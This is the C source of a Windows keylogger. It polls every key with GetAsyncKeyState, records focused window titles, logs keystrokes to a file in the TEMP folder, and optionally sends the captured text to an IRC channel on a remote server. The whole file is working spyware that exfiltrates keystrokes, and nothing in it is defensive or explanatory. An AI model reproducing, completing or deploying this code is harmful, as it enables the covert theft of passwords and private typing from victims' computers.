/*
	Author: Axel Isaksson (h4xxel)
	http://h4xxel.ath.cx/
*/

#include <stdio.h>
#include <time.h>
#include <windows.h>
#include <string.h>
#include <winsock2.h>
#include "layout.h"
#include "klog.h"
#include "config.h"

time_t t;
FILE *logfile;

char* get_timestamp() {
	t=time(NULL);
	return ctime(&t);
}

void log_msg(char* message) {
	char logbuf[256];
	sprintf(logbuf, "%s %s", message, get_timestamp());
	if(LOG&LOG_FILE)
		fprintf(logfile, "\n%s", logbuf);
	if(LOG&LOG_IRC)
		irc_send(IRC_CHANNEL, logbuf);
}

void clear_buffer() {
	int i;
	for(i=1;i<256;i++)
		GetAsyncKeyState(i);
}

void output_charbuf() {
	char* i;
	for(i=current_char+1;i<(charbuf+sizeof(charbuf));i++)
		*(i)=0;
	current_char=charbuf;
	if(LOG&LOG_IRC)
		irc_send(IRC_CHANNEL, charbuf);
	if(LOG&LOG_FILE)
		fflush(logfile);
}

void advance_charbuf() {
	if((current_char>=charbuf+sizeof(charbuf)-2)||(*current_char=='\n'))
		output_charbuf();
	else
		current_char++;
}

int main() {
	GetEnvironmentVariable("TEMP", buf, sizeof(buf));
	strcat(buf, "\\klog.txt\0");
	if(LOG&LOG_FILE)
		logfile=fopen(buf, "w");
	if(LOG&LOG_IRC) {
		irc_connect(IRC_SERVER, IRC_PORT, IRC_NICK);
		irc_join(IRC_CHANNEL, IRC_KEY);
	}
	log_msg("***Starting keylogger");
	clear_buffer();
	current_char=charbuf;
	while(1) {
		int i;
		irc_check_incomming();
		last_win=current_win;
		current_win=GetForegroundWindow();
		if(current_win!=NULL) {
			GetWindowText(current_win, current_title, sizeof(current_title));
			if(current_win==last_win&&strcmp(last_title, current_title)) {
				output_charbuf();
				sprintf(buf, "***Window caption change [%s]", current_title);
				log_msg(buf);
			} else if(current_win!=last_win) {
				output_charbuf();
				sprintf(buf, "***Focused window [%s]", current_title);
				log_msg(buf);
			}
			strcpy(last_title, current_title);
		}
		
		//get state of shift and caps keys
		shift_state=(GetAsyncKeyState(VK_SHIFT)>>15)&1;
		altgr_state=(GetAsyncKeyState(VK_RMENU)>>15)&1;
		caps_state=GetKeyState(VK_CAPITAL)&1;

		//check all keys against layout
		for(i=1;i<256;i++) {
			if(altgr_state) {
				if((GetAsyncKeyState(i)&0xEF)&&layout_altgr[i-1]) {
					if(LOG&LOG_FILE)
						fputc(layout_altgr[i-1],logfile);
					*current_char=layout_altgr[i-1];
					advance_charbuf();
				}
			} else if((shift_state^(caps_state&&((i>0x40&&i<0x60)||SP_CHAR)))) {
				if((GetAsyncKeyState(i)&0xEF)&&layout_shift[i-1]) {
					if(LOG&LOG_FILE)
						fputc(layout_shift[i-1],logfile);
					*current_char=layout_shift[i-1];
					advance_charbuf();
				}
			} else {
				if((GetAsyncKeyState(i)&0xEF)&&layout[i-1]) {
					if(LOG&LOG_FILE)
						fputc(layout[i-1],logfile);
					*current_char=layout[i-1];
					advance_charbuf();
				}
			}
		}

		if(GetAsyncKeyState(VK_ESCAPE)&&ESCAPE_EXITS)
			break;
		sleep(1);
	}
	output_charbuf();
	log_msg("***Shutting down");
	if(LOG&LOG_FILE)
		fclose(logfile);
	if(LOG&LOG_IRC)
		irc_disconnect();
	return 0;
}
